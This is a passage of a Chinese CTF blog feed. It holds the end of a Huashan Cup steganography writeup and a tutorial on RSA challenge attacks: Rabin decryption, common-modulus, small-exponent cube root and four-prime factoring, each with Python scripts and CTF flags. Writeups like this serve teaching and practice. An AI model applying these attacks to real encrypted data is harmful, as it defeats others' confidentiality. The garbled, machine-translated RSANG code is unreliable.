href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:45:42%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:45:42%20"></a></p><h2 id="客官，听点小曲儿？"><a href="#客官，听点小曲儿？" class="headerlink" title="客官，听点小曲儿？"></a>客官，听点小曲儿？</h2><p>这题的mp3地址不是直接提供的，而是提供了一个网站，留意网页的header，里面有key为cherrs，而mp3最常见的隐写术就是mp3Stego，找一个解密即可</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Decode –X song.mp3 –P cheers</span><br></pre></td></tr></table></figure><p>得到</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">fdc3_#l&#123;tsf#ahfte&#125;gs:en_hmgcX_poe&#96;</span><br></pre></td></tr></table></figure><p>就会生成文件，文件里内容是经过不规则的栅栏加密过，只要自己手工按照flag形式去调整下即可。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flag_Xd&#123;hSh_ctf:mp3stego_fence##&#125;</span><br></pre></td></tr></table></figure><h2 id="网红之路"><a href="#网红之路" class="headerlink" title="网红之路"></a>网红之路</h2><p>这个比赛之后才做出来的</p><p><a href="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:52:33%20" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/2016/09/11/09:52:33%20"></a></p><p>接着就是简单的编码问题了</p><h1 id="Finally"><a href="#Finally" class="headerlink" title="Finally"></a>Finally</h1><p>一个安卓都没做出来   好尴尬。。。。</p><p><a href="http://7xi72v.com1.z0.glb.clouddn.com/16-9-11/99289129.jpg" class="gallery-item"><img src="http://7xi72v.com1.z0.glb.clouddn.com/16-9-11/99289129.jpg"></a></p></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Writeup </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 华山杯CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一大波RSA就要来了~~</title>
      <link href="Common-types-of-RSA.html"/>
      <url>Common-types-of-RSA.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h1 id="先不说RSA原理-我也懒得重复的造轮子"><a href="#先不说RSA原理-我也懒得重复的造轮子" class="headerlink" title="先不说RSA原理  我也懒得重复的造轮子"></a>先不说RSA原理  我也懒得重复的造轮子</h1><h1 id="RSA–求d"><a href="#RSA–求d" class="headerlink" title="RSA–求d"></a>RSA–求d</h1><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</p><p>求解出d</p><p>将得到的d提交：</p><p>题目很简单 有取巧的方法 也有笨方法</p><h2 id="自己代码解决-笨办法"><a href="#自己代码解决-笨办法" class="headerlink" title="自己代码解决  笨办法"></a>自己代码解决  笨办法</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">p = int(raw_input(<span class="string">&quot;Enter a p: &quot;</span>))   </span><br><span class="line">q = int(raw_input(<span class="string">&quot;Enter a q: &quot;</span>))  </span><br><span class="line">e = int(raw_input(<span class="string">&quot;Enter a e: &quot;</span>))   </span><br><span class="line">t = (p<span class="number">-1</span>)*(q<span class="number">-1</span>)   </span><br><span class="line">i=<span class="number">0</span>  </span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span> :   </span><br><span class="line"><span class="keyword">if</span> (<span class="number">1</span>-t*i)%e == <span class="number">0</span>:   </span><br><span class="line"><span class="keyword">break</span>   </span><br><span class="line">i-=<span class="number">1</span>   </span><br><span class="line"><span class="keyword">print</span> i </span><br><span class="line"><span class="keyword">print</span> <span class="string">&#x27;ok:&#x27;</span> + <span class="string">&#x27;%d&#x27;</span> % ((<span class="number">1</span>-t*i)/e)</span><br></pre></td></tr></table></figure><p>脚本写得老粗糙</p><h2 id="python模块解决"><a href="#python模块解决" class="headerlink" title="python模块解决"></a>python模块解决</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">p = int(raw_input(<span class="string">&quot;Enter a p: &quot;</span>))   </span><br><span class="line">q = int(raw_input(<span class="string">&quot;Enter a q: &quot;</span>))  </span><br><span class="line">e = int(raw_input(<span class="string">&quot;Enter a e: &quot;</span>))   </span><br><span class="line">gmpy2.invert(e, (p<span class="number">-1</span>)*(q<span class="number">-1</span>)) `</span><br></pre></td></tr></table></figure><h2 id="别人已经写好的工具-即rsatool-py"><a href="#别人已经写好的工具-即rsatool-py" class="headerlink" title="别人已经写好的工具 即rsatool.py"></a>别人已经写好的工具 即rsatool.py</h2><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rsatool.py -p <span class="number">473398607161</span> -q <span class="number">451149</span> <span class="number">84376578389</span> -e <span class="number">17</span> </span><br></pre></td></tr></table></figure><h1 id="基础求明文-N已经被分解"><a href="#基础求明文-N已经被分解" class="headerlink" title="基础求明文-N已经被分解"></a>基础求明文-N已经被分解</h1><p>在一次RSA密钥对生成中，假设p=473398607161，q=4511491，e=17</p><p>某个明文加密后的结果为：727835100378484285<br>将得到的明文提交：<br>既然以及有了p，q那么就可以拿到私钥了</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">rsatool.py -p <span class="number">473398607161</span> -q <span class="number">4511491</span> -e <span class="number">17</span></span><br><span class="line">Using (p, q) to initialise RSA instance</span><br><span class="line"></span><br><span class="line">n = <span class="number">2135733555619387051</span> (<span class="number">0x1da3a65a6d9356ab</span>)</span><br><span class="line"></span><br><span class="line">e = <span class="number">17</span> (<span class="number">0x11</span>)</span><br><span class="line"></span><br><span class="line">d = <span class="number">125631357777427553</span> (<span class="number">0x1be550de4f93c61</span>)</span><br><span class="line"></span><br><span class="line">p = <span class="number">473398607161</span> (<span class="number">0x6e38c17d39</span>)</span><br><span class="line"></span><br><span class="line">q = <span class="number">4511491</span> (<span class="number">0x44d703</span>)</span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> (<span class="string">&#x27;%x&#x27;</span> % pow(<span class="number">727835100378484285</span>,<span class="number">125631357777427553</span>,<span class="number">2135733555619387051</span>)).decode(<span class="string">&#x27;hex&#x27;</span>)</span><br><span class="line">testMe!</span><br></pre></td></tr></table></figure><h1 id="基础求明文-N未被分解"><a href="#基础求明文-N未被分解" class="headerlink" title="基础求明文-N未被分解"></a>基础求明文-N未被分解</h1><p>N = 322831561921859， e = 23，cipher = 0xdc2eeeb2782c</p><p>题目没有上一题给的p，和q，所以得对N进行分解 </p><h2 id="yafu配合rsatool-py-python"><a href="#yafu配合rsatool-py-python" class="headerlink" title="yafu配合rsatool.py + python"></a>yafu配合rsatool.py + python</h2><p>这个题目和上面题目的区别就是N没有被分解 用<code>yafu</code>这个工具可以进行大数字分解<br><a href="http://oayoilchh.bkt.clouddn.com/RSA_yafu.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/RSA_yafu.png"></a><br>然后剩下的方法和上面差不多就不累加叙述了</p><h1 id="512位的大家伙"><a href="#512位的大家伙" class="headerlink" title="512位的大家伙"></a>512位的大家伙</h1><p>你没看错，这还真是密码学系列了，相信你已经解出前两题了，那么继续看这题吧。<br>链接：<a href="http://pan.baidu.com/s/1o77LozK">http://pan.baidu.com/s/1o77LozK</a> 密码：1ik4</p><p>这个题目第一次遇到的时候我碰到了一个麻烦 就是不知怎么提取公钥<br>两个方法</p><h2 id="Python解决"><a href="#Python解决" class="headerlink" title="Python解决"></a>Python解决</h2><p>利用python的<code>Crypto</code></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.PublicKey <span class="keyword">import</span> RSA</span><br><span class="line">A = RSA.importKey(open(<span class="string">&#x27;pem文件名字&#x27;</span>).read())</span><br><span class="line">A.n</span><br><span class="line">A.e</span><br></pre></td></tr></table></figure><p>如图 就得到了公钥<br><a href="http://oayoilchh.bkt.clouddn.com/RSA_Publkey.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/RSA_Publkey.png"></a><br>然后剩下的步骤依旧就是 分解N 生成私钥 解密</p><h2 id="openssl解决"><a href="#openssl解决" class="headerlink" title="openssl解决"></a>openssl解决</h2><p>提取公钥</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">openssl x509 -outform PEM -in server&#x2F;server.crt -pubkey -out server&#x2F;server.pubkey</span><br></pre></td></tr></table></figure><h1 id="hard-RSA"><a href="#hard-RSA" class="headerlink" title="hard RSA"></a>hard RSA</h1><p>相信你已经做出了medium RSA，这题的pubkey在medium RSA的基础上我做了点手脚，继续挑战吧。<br>Hint1: 1.不需要爆破。2.用你的数学知识解决此题。3.难道大家都不会开根号吗？<br>链接：<a href="http://pan.baidu.com/s/1kVxYmiV">http://pan.baidu.com/s/1kVxYmiV</a> 密码：oix5</p><p> 考验大家数学知识的来了</p><p>这个题目和上个题目的相同之处是 N是一样的 但是这个题目的 e = 2<br>e一样 这个题目应该是    <code>Rabin</code>密码<br><a href="http://oayoilchh.bkt.clouddn.com/RSA_Rabin.png" class="gallery-item"><img src="http://oayoilchh.bkt.clouddn.com/RSA_Rabin.png"></a><br>直接给脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> libnum</span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f = open(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">c = f.read()</span><br><span class="line">c = libnum.s2n(c)</span><br><span class="line">p = <span class="number">275127860351348928173285174381581152299</span></span><br><span class="line">q = <span class="number">319576316814478949870590164193048041239</span></span><br><span class="line">n = p*q</span><br><span class="line">r = pow(c,(p+<span class="number">1</span>)/<span class="number">4</span>,p)</span><br><span class="line">s = pow(c,(q+<span class="number">1</span>)/<span class="number">4</span>,q)</span><br><span class="line">a = gmpy2.invert(p,q)</span><br><span class="line">b = gmpy2.invert(q,p)</span><br><span class="line">x =(a*p*s+b*q*r)%n</span><br><span class="line">y =(a*p*s-b*q*r)%n</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(x%n)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s((-x)%n)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s(y%n)</span><br><span class="line"><span class="keyword">print</span> libnum.n2s((-y)%n)</span><br></pre></td></tr></table></figure><h1 id="Very-Hard-RSA"><a href="#Very-Hard-RSA" class="headerlink" title="Very Hard RSA"></a>Very Hard RSA</h1><p>前几题因为N太小，都被你攻破了，出题人这次来了个RSA4096，是否接受挑战就看你了。<br>链接：<a href="http://pan.baidu.com/s/1jIq8IKA">http://pan.baidu.com/s/1jIq8IKA</a> 密码：k43g</p><p>对于这个题目 我们会发现 是用相同的N，不同的e进行加密的 </p><p>这里有个技巧 如果我们发现 N相同 e不同其实我们可以用共模攻击</p><p>原理不说 直接给脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s,s2n</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span>(<span class="params">a, b</span>):</span></span><br><span class="line">  <span class="keyword">if</span> a == <span class="number">0</span>:</span><br><span class="line">    <span class="keyword">return</span> (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">  <span class="keyword">else</span>:</span><br><span class="line">    g, y, x = egcd(b % a, a)</span><br><span class="line">    <span class="keyword">return</span> (g, x - (b // a) * y, y)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">  <span class="comment"># 输入参数</span></span><br><span class="line">  <span class="comment"># fo1 = open(&#x27;flag.enc1&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line">  <span class="comment"># fo2 = open(&#x27;flag.enc2&#x27;, &#x27;rb&#x27;)</span></span><br><span class="line">  <span class="comment"># c1 =  fo1.read()</span></span><br><span class="line">  <span class="comment"># c2 =  fo2.read()</span></span><br><span class="line">  n = <span class="number">116547141139745534253172934123407786743246513874292261984447028928003798881819567221547298751255790928878194794155722543477883428672342894945552668904410126460402501558930911637857436926624838677630868157884406020858164140754510239986466552869866296144106255873879659676368694043769795604582888907403261286211</span></span><br><span class="line">  c1 = <span class="number">78552378607874335972488545767374401332953345586323262531477516680347117293352843468592985447836452620945707838830990843415342047337735534418287912723395148814463617627398248738969202758950481027762126608368555442533803610260859075919831387641824493902538796161102236794716963153162784732179636344267189394853</span></span><br><span class="line">  c2 = <span class="number">98790462909782651815146615208104450165337326951856608832305081731255876886710141821823912122797166057063387122774480296375186739026132806230834774921466445172852604926204802577270611302881214045975455878277660638731607530487289267225666045742782663867519468766276566912954519691795540730313772338991769270201</span></span><br><span class="line">  e1 = <span class="number">1804229351</span></span><br><span class="line">  e2 = <span class="number">17249876309</span></span><br><span class="line">  s = egcd(e1, e2)</span><br><span class="line">  s1 = s[<span class="number">1</span>]</span><br><span class="line">  s2 = s[<span class="number">2</span>]</span><br><span class="line">  <span class="comment"># 求模反元素</span></span><br><span class="line">  <span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">    s1 = - s1</span><br><span class="line">    c1 = invert(c1, n)</span><br><span class="line">  <span class="keyword">elif</span> s2&lt;<span class="number">0</span>:</span><br><span class="line">    s2 = - s2</span><br><span class="line">    c2 = invert(c2, n)</span><br><span class="line"></span><br><span class="line">  m = pow(c1,s1,n)*pow(c2,s2,n) % n</span><br><span class="line">  <span class="keyword">print</span> n2s(m)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">  main()</span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Extremely-hard-RSA"><a href="#Extremely-hard-RSA" class="headerlink" title="Extremely hard RSA"></a>Extremely hard RSA</h1><p>没想到RSA4096都被你给破了，一定是我的问题，给了你太多信息，这次我只给你一个flag的加密值和公钥，仍然是RSA4096，我就不信你还能解出来。<br>链接：<a href="http://pan.baidu.com/s/1skBIUuD">http://pan.baidu.com/s/1skBIUuD</a> 密码：xvfr<br> 题目的重点是：<br>公钥中，e=3，N非常大。所以可以不断地c+N然后开三次方，直接写代码爆破<br>这里直接用白师傅写的的脚本  </p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line">__author__ = <span class="string">&#x27;ByStudent&#x27;</span></span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> s2n,n2s</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> iroot</span><br><span class="line">n = <span class="number">0xB0BEE5E3E9E5A7E8D00B493355C618FC8C7D7D03B82E409951C182F398DEE3104580E7BA70D383AE5311475656E8A964D380CB157F48C951ADFA65DB0B122CA40E42FA709189B719A4F0D746E2F6069BAF11CEBD650F14B93C977352FD13B1EEA6D6E1DA775502ABFF89D3A8B3615FD0DB49B88A976BC20568489284E181F6F11E270891C8EF80017BAD238E363039A458470F1749101BC29949D3A4F4038D463938851579C7525A69984F15B5667F34209B70EB261136947FA123E549DFFF00601883AFD936FE411E006E4E93D1A00B0FEA541BBFC8C5186CB6220503A94B2413110D640C77EA54BA3220FC8F4CC6CE77151E29B3E06578C478BD1BEBE04589EF9A197F6F806DB8B3ECD826CAD24F5324CCDEC6E8FEAD2C2150068602C8DCDC59402CCAC9424B790048CCDD9327068095EFA010B7F196C74BA8C37B128F9E1411751633F78B7B9E56F71F77A1B4DAAD3FC54B5E7EF935D9A72FB176759765522B4BBC02E314D5C06B64D5054B7B096C601236E6CCF45B5E611C805D335DBAB0C35D226CC208D8CE4736BA39A0354426FAE006C7FE52D5267DCFB9C3884F51FDDFDF4A9794BCFE0E1557113749E6C8EF421DBA263AFF68739CE00ED80FD0022EF92D3488F76DEB62BDEF7BEA6026F22A1D25AA2A92D124414A8021FE0C174B9803E6BB5FAD75E186A946A17280770F1243F4387446CCCEB2222A965CC30B3929</span></span><br><span class="line">e = <span class="number">3</span></span><br><span class="line">f = open(<span class="string">&#x27;flag.enc&#x27;</span>,<span class="string">&#x27;rb&#x27;</span>)</span><br><span class="line">c= f.read()</span><br><span class="line">c = s2n(c)</span><br><span class="line">f.close()</span><br><span class="line">i = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="number">1</span>:</span><br><span class="line">    res = iroot(c+i*n,<span class="number">3</span>)</span><br><span class="line">    <span class="keyword">if</span>(res[<span class="number">1</span>] == <span class="literal">True</span>):</span><br><span class="line">        <span class="keyword">print</span> res</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">print</span> <span class="string">&quot;i=&quot;</span>+str(i)</span><br><span class="line">    i = i+<span class="number">1</span></span><br><span class="line"><span class="comment">#i=118719487</span></span><br><span class="line">m = <span class="number">440721643740967258786371951429849843897639673893942371730874939742481383302887786063966117819631425015196093856646526738786745933078032806737504580146717737115929461581126895844008044713461807791172016433647699394456368658396746134702627548155069403689581548233891848149612485605022294307233116137509171389596747894529765156771462793389236431942344003532140158865426896855377113878133478689191912682550117563858186</span></span><br><span class="line"><span class="keyword">print</span> n2s(m)</span><br><span class="line"><span class="comment"># 结果</span></span><br><span class="line"><span class="comment"># Didn&#x27;t you know RSA padding is really important? Now you see a non-padding message is so dangerous. And you should notice this in future.Fl4g: PCTF&#123;Sm4ll_3xpon3nt_i5_W3ak&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><h1 id="Gold-LIke-RSA"><a href="#Gold-LIke-RSA" class="headerlink" title="Gold LIke RSA"></a>Gold LIke RSA</h1><p>这个题是到最后 i春秋把汪师傅的题上上去之后我才终于做出来的</p><p>既然你逼我到绝境，那就休怪我不客气了，代表上帝挑战你~<br>链接：<a href="http://pan.baidu.com/s/1qX7HmyS">http://pan.baidu.com/s/1qX7HmyS</a> 密码：4vjz</p><p>后来才知道这个题是PCTF的一道题目改的  <a href="http://mslc.ctf.su/wp/plaidctf-2014-rsa-writeup/">原题地址</a><br>先停在这 明天在写 </p><h1 id="RSANG"><a href="#RSANG" class="headerlink" title="RSANG"></a>RSANG</h1><p>尝试着对N分解<br>模量对数<br>看起来像形式的数字$N = (2^M + a)(2^M + b)(2^M + c)(2^M + d) $.<br>日志基 2 的弹性模量是 5568 所以$M=1392$.<br>我们现在可以做一些数学，看看什么信息，我们可以摆脱 4 二进制序列︰</p><p>$$ N = (2^M + a)(2^M +b)(2^M +c)(2^M +d) $$</p><p>$$ N = 2^{4M} + 2^{3M}(a + b + c + d) + 2^{2M}(ab + ac + ad + bc + bd + cd) + 2^M(bcd + acd + abd + abc) + abcd $$</p><p>让︰<br>$$ p = a + b + c + d $$</p><p>$$ q = ab + ac + ad + bc + bd + cd $$</p><p>$$ r = bcd + acd + abd + abc $$</p><p>$$ s = abcd $$</p><p>你会忍不住想上述 4 的二进制字符序列对应直接到$p$， $q$， $r$， $s$ ，但这里面有蹊跷︰ 只有$s$等于其各自的二进制序列。<br>其他的可能会在 0 或更多，因为奇数偶数有甚至总和。我们可以只是强制性，但它，所以我们会担心以后。<br>我们如何找出$a$， $b$，$c$和$d$给定$p$， $q$， $r$ ， $s$？高中数学的救援︰</p><p>$$ (X - x_1)(X - x_2)(X - x_3)(X - x_4) = 0 $$</p><p>$$ X^4 -(x_1 + x_2 + x_3 + x_4)X^3 + (x_1 x_2 + x_1 x_3 + x_1 x_4 + x_2 x_3 + x_2 x_4 + x_3 x_4)X^2 - (x_2 x_3 x_4 + x_1 x_3 x_4 + x_1 x_2 x_4 + x_1 x_2 x_3)X + x_1 x_2 x_3 x_4 = 0 $$<br>import math<br>import gmpy2<br>gmpy2.get_context().precision=5000<br>from polycubicroot import *<br>def Carpenter(p, q,r, s):<br>p = gmpy2.mpfr(p)<br>q = gmpy2.mpfr(q)<br>r = gmpy2.mpfr(r)<br>s = gmpy2.mpfr(s)<br>“””<br>Solves for all roots of the quartic polynomial P(x) = x^4 + px^3 + qx^2 + rx + s.<br>“””<br>#print “@@@ inside Carpenter”, p,q,r,s<br>pby4 = p/4.0<br>C = ((6 * pby4) - 3<em>p)<em>pby4 + q<br>D = (((-4</em>pby4) + 3</em>p)<em>pby4 - 2</em>q)<em>pby4 + r<br>E = (((pby4 - p)</em> pby4 + q)<em>pby4 - r)<em>pby4 + s<br>#print “C, D, E=”,C, D, E<br>root = None<br>for zero in polyCubicRoots(2</em>C, (C**2 - 4</em>E), -D<strong>2):<br>#print “zero = “, zero<br>if type(zero)== type(gmpy2.mpfr(1.0)) and zero &gt; 0.0:<br>root = zero<br>#print “found a positive root.”<br>break<br>if root == None:<br>return None<br>sqroot = gmpy2.sqrt(root)<br>Q1 = -root/4.0 - C/2.0 - D/2.0 / sqroot<br>Q2 = -root/4.0 - C/2.0 + D/2.0 / sqroot<br>#print “Q1,Q2=”, Q1, Q2<br>sqy2 = sqroot/2.0<br>if Q1 &gt;= 0.0:<br>sqQ1 = gmpy2.sqrt(Q1)<br>z1 = sqy2 + sqQ1 -pby4<br>z2 = sqy2 - sqQ1 -pby4<br>else:<br>sqQ1 = gmpy2.sqrt(-Q1)<br>z1 = (sqy2-pby4, sqQ1)<br>z2 = (sqy2-pby4, - sqQ1)<br>if Q2 &gt;= 0.0:<br>sqQ2 = gmpy2.sqrt(Q2)<br>z3 = -sqy2 - sqQ2 -pby4<br>z4 = -sqy2 + sqQ2 -pby4<br>else:<br>sqQ2 = gmpy2.sqrt(-Q2)<br>z3 = (-sqy2-pby4, sqQ2)<br>z4 = (-sqy2-pby4, -sqQ2)<br>return (z1, z2,z3, z4)<br>得到一个 4 元组解和循环的左侧和右侧的任何 4 根，看看是否我们得到的除数$s$，应完全$a b c d$。如果我们得到一个然后基本上解决问题。<br>剩下的唯一问题是，我们不知道多少零点的每个$p$， $q$ ，$r$有。让我们试着从 3 零 0 零的所有组合︰<br>p= 0b10001110000110111100100111111000100111<br>q= 0b1110110010101000100001010011110000010100100010111011100111100011010001010101<br>r= 0b1010111100101001100011011101101000000110011010100010001010001100010000111001010011110111011000110010000110010001<br>s= 0b11000010011110000010000010000101010000011101100011101110110110011111000000001011001101111100111001111110001100100101101010011011011101110111001110101<br>A=[]<br>B=[]<br>C=[]<br>D=[s]<br>for i in range(0,3):<br>A.append(p * (2**i))<br>B.append(q * (2</strong>i))<br>C.append(r * (2**i))<br>for i in A:<br>print “====================”<br>for j in B:<br>for k in C:<br>for l in D:<br>(x1, x2, x3, x4) = Carpenter(-i,j,-k,l)</p><h1 id="since-sometimes-the-solution-will-consist-of-complex-numbers-we’ll-just-disregard-those-with-a-try-except"><a href="#since-sometimes-the-solution-will-consist-of-complex-numbers-we’ll-just-disregard-those-with-a-try-except" class="headerlink" title="since sometimes the solution will consist of complex numbers, we’ll just disregard those with a try-except"></a>since sometimes the solution will consist of complex numbers, we’ll just disregard those with a try-except</h1><p>try:<br>#approximate value of x1<br>aprox = int(x1.<strong>floor</strong>())<br>for step in range(0,10000):<br>#try to the right<br>if s % (aprox + step) == 0:<br>print aprox + step<br>#and to the left<br>if s % (aprox - step) == 0:<br>print aprox - step<br>except:<br>pass</p><p>这样我们得到了所有的四个因素 ！让我们看一下这些实际上将弥补$N$. 而且刚好对应6个密文<br>通常情况下，密文的内容有关于同一密钥作为弹性模量，但在这种情况下他们不。这意味着，要么</p><p>指数是小 (说 3) 和消息$m$是真的很短。但然后还有一个主要的问题︰ 因为根本不会被加密明文$m^3$将小于$N$所以$ m^3 $等于$ m^3 \bmod N $(没有加密 = = 坏)<br>指数是一个体面的大小 (通常是 65537) 但模量不是$N$。那么它是什么？提示︰ 密码密钥，大约是一半的模量。<br>由于有 4 质数我们可以作出以下模量︰ $ab $ $ ac $ $ ad $ $ bc $ $ bd $ $ cd$。六模量，六个密码文本 ！</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">f1 = <span class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686599733</span></span><br><span class="line">f2 = <span class="number">108082147276398906822234149167480016132157014049560913761488880190018027488520386318253742675423286348552334110023434741671427911613197684395221211646299519273129194692306445874938199068586137486874290442314459278649345469626426790676801658394799404284116771456479272808343825651929906737811050557836671896732124546721747709022607151231423494815945385193624295868730390462068156825588342737037490320356361648437686598461</span></span><br><span class="line">f3 = <span 